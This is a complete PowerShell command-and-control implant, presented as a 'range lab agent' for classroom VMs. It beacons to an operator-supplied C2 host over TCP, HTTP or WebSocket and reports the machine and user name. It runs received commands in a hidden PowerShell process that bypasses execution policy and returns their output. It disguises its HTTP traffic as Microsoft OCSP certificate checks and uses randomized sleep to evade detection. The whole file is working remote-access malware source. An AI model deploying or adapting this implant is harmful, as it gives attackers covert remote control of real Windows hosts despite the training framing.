# Range lab agent for stock Windows 10 (PowerShell 5.1). No Python required.
# Channels: tcp, http, ws. DNS, MQTT, and ICMP stay on range.py.
# Isolated classroom VMs only.
param(
    [Parameter(Mandatory = $true)][string]$C2,
    [Parameter(Mandatory = $true)][ValidateSet("tcp", "http", "ws")][string]$Channel,
    [Parameter(Mandatory = $true)][string]$Token,
    [string]$Id = $env:COMPUTERNAME,
    [ValidateSet("continuous", "off", "live", "hunt")][string]$Timing = "continuous",
    [int]$TcpPort = 443,
    [int]$HttpPort = 80,
    [int]$WsPort = 8070
)

$ErrorActionPreference = "Continue"
if ($Token.Length -lt 8) { throw "token must be at least 8 characters" }

function Get-SafeId([string]$raw) {
    $clean = ([string]$raw).ToLower() -replace "[^a-z0-9-]", ""
    $clean = $clean.Trim("-")
    if (-not $clean) { $clean = "host" }
    if ($clean.Length -gt 24) { $clean = $clean.Substring(0, 24) }
    return $clean
}

$script:AgentId = Get-SafeId $Id
$script:Token = $Token
$script:Timing = $Timing
$script:Cwd = (Get-Location).Path
$script:Parts = @{}
$script:Utf8 = New-Object System.Text.UTF8Encoding $false

function Escape-JsonText([string]$s) {
    if ($null -eq $s) { return "" }
    $sb = New-Object System.Text.StringBuilder
    foreach ($ch in $s.ToCharArray()) {
        $code = [int]$ch
        if ($ch -eq "\") { [void]$sb.Append("\\") }
        elseif ($ch -eq '"') { [void]$sb.Append('\"') }
        elseif ($ch -eq "`n") { [void]$sb.Append('\n') }
        elseif ($ch -eq "`r") { [void]$sb.Append('\r') }
        elseif ($ch -eq "`t") { [void]$sb.Append('\t') }
        elseif ($code -lt 32) { [void]$sb.Append(("\u{0:x4}" -f $code)) }
        else { [void]$sb.Append($ch) }
    }
    return $sb.ToString()
}

function Get-RangeMac($v, $i, $n, $o, $p, $c, $d) {
    $mat = "{0}|{1}|{2}|{3}|{4}|{5}|{6}" -f [int]$v, [string]$i, [int]$n, [string]$o, [int]$p, [int]$c, [string]$d
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = $script:Utf8.GetBytes($script:Token)
    $hash = $hmac.ComputeHash($script:Utf8.GetBytes($mat))
    $hex = -join ($hash | ForEach-Object { $_.ToString("x2") })
    return $hex.Substring(0, 12)
}

function Seal-Frame([string]$op, [string]$data, [int]$seq, [int]$part, [int]$total) {
    if ($null -eq $data) { $data = "" }
    $tag = Get-RangeMac 1 $script:AgentId $seq $op $part $total $data
    $pairs = @(
        ('"a":"{0}"' -f (Escape-JsonText $tag)),
        ('"c":{0}' -f [int]$total),
        ('"d":"{0}"' -f (Escape-JsonText $data)),
        ('"i":"{0}"' -f (Escape-JsonText $script:AgentId)),
        ('"n":{0}' -f [int]$seq),
        ('"o":"{0}"' -f (Escape-JsonText $op)),
        ('"p":{0}' -f [int]$part),
        '"v":1'
    )
    return "{" + ($pairs -join ",") + "}"
}

function Test-FrameTooBig([string]$frame) {
    if ($Channel -eq "http") {
        return ((Convert-TextToHex $frame).Length -gt 1500)
    }
    $b64 = [Convert]::ToBase64String($script:Utf8.GetBytes($frame))
    return ($b64.Length -gt 6000)
}

function Split-RangeData([string]$op, [string]$data, [int]$seq) {
    if ($null -eq $data) { $data = "" }
    $parts = New-Object System.Collections.Generic.List[string]
    $rest = $data
    while ($true) {
        if ($rest.Length -eq 0 -and $parts.Count -gt 0) { break }
        if ($rest.Length -eq 0) { $parts.Add(""); break }
        $lo = 1
        $hi = $rest.Length
        $best = 0
        while ($lo -le $hi) {
            $mid = [int][Math]::Floor(($lo + $hi) / 2)
            $piece = $rest.Substring(0, $mid)
            $trial = Seal-Frame $op $piece $seq 9999 9999
            if (Test-FrameTooBig $trial) { $hi = $mid - 1 } else { $best = $mid; $lo = $mid + 1 }
        }
        if ($best -lt 1) { $best = 1 }
        $parts.Add($rest.Substring(0, $best))
        if ($best -ge $rest.Length) { break }
        $rest = $rest.Substring($best)
    }
    $frames = @()
    $total = $parts.Count
    for ($index = 0; $index -lt $total; $index++) {
        $frames += ,(Seal-Frame $op $parts[$index] $seq $index $total)
    }
    Write-Output -NoEnumerate $frames
}

function Convert-TextToHex([string]$text) {
    $bytes = $script:Utf8.GetBytes($text)
    $sb = New-Object System.Text.StringBuilder ($bytes.Length * 2)
    foreach ($b in $bytes) { [void]$sb.Append($b.ToString("x2")) }
    return $sb.ToString()
}

function Convert-HexToText([string]$hex) {
    if ($hex.Length % 2 -ne 0) { throw "odd hex" }
    $bytes = New-Object byte[] ($hex.Length / 2)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
    }
    return $script:Utf8.GetString($bytes)
}

function Convert-ToB64([string]$text) {
    return [Convert]::ToBase64String($script:Utf8.GetBytes($text))
}

function Convert-FromB64([string]$text) {
    $clean = ($text -replace "\s", "")
    $pad = (4 - ($clean.Length % 4)) % 4
    if ($pad -gt 0) { $clean = $clean + ("=" * $pad) }
    return $script:Utf8.GetString([Convert]::FromBase64String($clean))
}

function Invoke-RangeCommand([string]$cmd) {
    $dir = Join-Path $env:TEMP ("range-" + [guid]::NewGuid().ToString("n"))
    New-Item -ItemType Directory -Path $dir | Out-Null
    $scriptPath = Join-Path $dir "run.ps1"
    $cwdPath = Join-Path $dir "cwd.txt"
    $wrapPath = Join-Path $dir "wrap.ps1"
    try {
        [IO.File]::WriteAllText($scriptPath, $cmd, $script:Utf8)
        $cwdEsc = $script:Cwd.Replace("'", "''")
        $scriptEsc = $scriptPath.Replace("'", "''")
        $cwdFileEsc = $cwdPath.Replace("'", "''")
        $wrapper = @"
Set-Location -LiteralPath '$cwdEsc'
. '$scriptEsc'
`$rc = if (`$?) { 0 } else { 1 }
Set-Content -LiteralPath '$cwdFileEsc' -Value (Get-Location).Path -Encoding ASCII
exit `$rc
"@
        [IO.File]::WriteAllText($wrapPath, $wrapper, $script:Utf8)
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `"$wrapPath`""
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $proc = New-Object System.Diagnostics.Process
        $proc.StartInfo = $psi
        [void]$proc.Start()
        $finished = $proc.WaitForExit(120000)
        if (-not $finished) {
            try { $proc.Kill() } catch {}
            $text = $proc.StandardOutput.ReadToEnd() + $proc.StandardError.ReadToEnd()
            $text += "`n[timed out after 120s]`n"
            $rc = 124
        } else {
            $text = $proc.StandardOutput.ReadToEnd() + $proc.StandardError.ReadToEnd()
            $rc = $proc.ExitCode
        }
        if (Test-Path -LiteralPath $cwdPath) {
            $next = (Get-Content -LiteralPath $cwdPath -Raw).Trim()
            if ($next -and (Test-Path -LiteralPath $next)) { $script:Cwd = $next }
        }
        if ($text.Length -gt 48000) { $text = $text.Substring(0, 48000) + "`n[truncated]`n" }
        if (-not $text.EndsWith("`n")) { $text += "`n" }
        return ($text + "[rc=$rc]")
    } finally {
        Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Receive-Frame([string]$json) {
    try { $obj = $json | ConvertFrom-Json } catch { return @() }
    $got = [string]$obj.a
    $calc = Get-RangeMac $obj.v $obj.i $obj.n $obj.o $obj.p $obj.c $obj.d
    if ($got.Length -ne 12 -or $got -ne $calc) { return @() }
    if ([string]$obj.i -ne $script:AgentId) { return @() }
    $op = [string]$obj.o
    if ($op -eq "n") { return @() }
    if ($op -eq "f") {
        if ($obj.d -eq "continuous" -or $obj.d -eq "off" -or $obj.d -eq "live" -or $obj.d -eq "hunt") { $script:Timing = [string]$obj.d }
        Write-Output -NoEnumerate (Split-RangeData "r" ("profile={0}`n[rc=0]" -f $script:Timing) ([int]$obj.n))
        return
    }
    if ($op -ne "x") { return @() }
    $key = "{0}:{1}" -f $op, ([int]$obj.n)
    if (-not $script:Parts.ContainsKey($key)) { $script:Parts[$key] = @{} }
    $script:Parts[$key][[int]$obj.p] = [string]$obj.d
    $count = [int]$obj.c
    if ($script:Parts[$key].Count -lt $count) { return @() }
    $full = ""
    for ($i = 0; $i -lt $count; $i++) {
        if (-not $script:Parts[$key].ContainsKey($i)) { return @() }
        $full += [string]$script:Parts[$key][$i]
    }
    $script:Parts.Remove($key)
    $output = Invoke-RangeCommand $full
    Write-Output -NoEnumerate (Split-RangeData "r" $output ([int]$obj.n))
}

function Get-HelloFrames {
    $meta = "{0}|windows|{1}|{2}|ps|{3}" -f $script:AgentId, $env:USERNAME, $Channel, $script:Timing
    Write-Output -NoEnumerate (Split-RangeData "h" $meta 0)
}

function Wait-RangeTick {
    if ($script:Timing -eq "off") {
        Start-Sleep -Seconds (Get-Random -Minimum 1500 -Maximum 2100)
    } elseif ($script:Timing -eq "hunt") {
        Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 46)
    } else {
        Start-Sleep -Seconds 1
    }
}

function Invoke-HttpGet([string]$url) {
    try {
        $req = [System.Net.HttpWebRequest]::Create($url)
        $req.Method = "GET"
        $req.UserAgent = "Microsoft-CryptoAPI/10.0"
        $req.Accept = "*/*"
        $req.Timeout = 8000
        $req.KeepAlive = $false
        $req.Headers.Add("Cookie", ("sid=" + $script:AgentId))
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        $text = $reader.ReadToEnd()
        $reader.Close()
        $resp.Close()
        return $text
    } catch {
        return $null
    }
}

function Get-OcspTask([string]$body) {
    if (-not $body) { return $null }
    foreach ($line in ($body -split "`n")) {
        if ($line -match "^(?i)nonce:\s*([0-9a-fA-F]+)\s*$") {
            $nonce = $Matches[1]
            if ($nonce.Length -gt 32 -and ($nonce.Length % 2) -eq 0) {
                try { return (Convert-HexToText $nonce) } catch { return $null }
            }
        }
    }
    return $null
}

function Start-HttpAgent {
    $base = "http://{0}:{1}" -f $C2, $HttpPort
    $outbox = New-Object System.Collections.Generic.Queue[string]
    foreach ($frame in (Get-HelloFrames)) { $outbox.Enqueue($frame) }
    while ($true) {
        if ($outbox.Count -gt 0) {
            $frame = $outbox.Dequeue()
            $hex = Convert-TextToHex $frame
            [void](Invoke-HttpGet ($base + "/ocsp/nonce/" + $hex))
            continue
        }
        $body = Invoke-HttpGet ($base + "/ocsp/status")
        $task = Get-OcspTask $body
        if ($task) {
            foreach ($frame in (Receive-Frame $task)) { $outbox.Enqueue($frame) }
            continue
        }
        Wait-RangeTick
    }
}

function Start-TcpAgent {
    while ($true) {
        $client = $null
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($C2, $TcpPort)
            $stream = $client.GetStream()
            $stream.ReadTimeout = 2000
            $reader = New-Object System.IO.StreamReader($stream, $script:Utf8)
            $writer = New-Object System.IO.StreamWriter($stream, $script:Utf8)
            $writer.NewLine = "`n"
            $writer.AutoFlush = $true
            foreach ($frame in (Get-HelloFrames)) { $writer.WriteLine((Convert-ToB64 $frame)) }
            while ($true) {
                try { $line = $reader.ReadLine() } catch { continue }
                if ($null -eq $line) { break }
                if (-not $line.Trim()) { continue }
                try { $json = Convert-FromB64 $line } catch { continue }
                foreach ($frame in (Receive-Frame $json)) { $writer.WriteLine((Convert-ToB64 $frame)) }
            }
        } catch {
            Start-Sleep -Seconds 3
        } finally {
            if ($client) { $client.Close() }
        }
    }
}

function Start-WsAgent {
    while ($true) {
        $ws = $null
        try {
            $ws = New-Object System.Net.WebSockets.ClientWebSocket
            $cts = New-Object System.Threading.CancellationTokenSource
            $uri = [Uri]("ws://{0}:{1}/notifications" -f $C2, $WsPort)
            $ws.ConnectAsync($uri, $cts.Token).Wait()
            foreach ($frame in (Get-HelloFrames)) { Send-WsText $ws $cts (Convert-ToB64 $frame) }
            while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
                $incoming = Receive-WsText $ws $cts
                if ($null -eq $incoming) { break }
                try { $json = Convert-FromB64 $incoming } catch { continue }
                foreach ($frame in (Receive-Frame $json)) { Send-WsText $ws $cts (Convert-ToB64 $frame) }
            }
        } catch {
            Start-Sleep -Seconds 3
        } finally {
            if ($ws) { $ws.Dispose() }
        }
    }
}

function Send-WsText($ws, $cts, [string]$text) {
    $bytes = $script:Utf8.GetBytes($text)
    $segment = New-Object "System.ArraySegment[byte]" -ArgumentList (, $bytes)
    $ws.SendAsync(
        $segment,
        [System.Net.WebSockets.WebSocketMessageType]::Text,
        $true,
        $cts.Token
    ).Wait()
}

function Receive-WsText($ws, $cts) {
    $buffer = New-Object byte[] 16384
    $segment = New-Object "System.ArraySegment[byte]" -ArgumentList (, $buffer)
    $sb = New-Object System.Text.StringBuilder
    do {
        $result = $ws.ReceiveAsync($segment, $cts.Token).Result
        if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) { return $null }
        [void]$sb.Append($script:Utf8.GetString($buffer, 0, $result.Count))
    } while (-not $result.EndOfMessage)
    return $sb.ToString()
}

Write-Output ("range agent {0} channel {1} -> {2} timing {3}" -f $script:AgentId, $Channel, $C2, $script:Timing)
if ($Channel -eq "http") { Start-HttpAgent }
elseif ($Channel -eq "ws") { Start-WsAgent }
else { Start-TcpAgent }
